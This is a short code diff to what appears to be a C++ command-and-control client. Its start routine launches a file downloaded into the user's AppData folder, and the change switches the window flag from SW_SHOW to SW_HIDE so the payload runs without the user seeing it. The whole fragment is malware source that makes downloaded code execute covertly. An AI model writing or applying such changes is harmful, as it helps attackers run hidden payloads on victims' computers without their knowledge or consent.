@@ -126,5 +126,5 @@ void C2::start() {
 
 	printf("Starting downloaded file... \n");
 	string path = this->util.getAppData() + this->util.getDownloaded();
-	ShellExecute(NULL, "open", path.c_str(), NULL, NULL, SW_SHOW);
+	ShellExecute(NULL, "open", path.c_str(), NULL, NULL, SW_HIDE);
 }
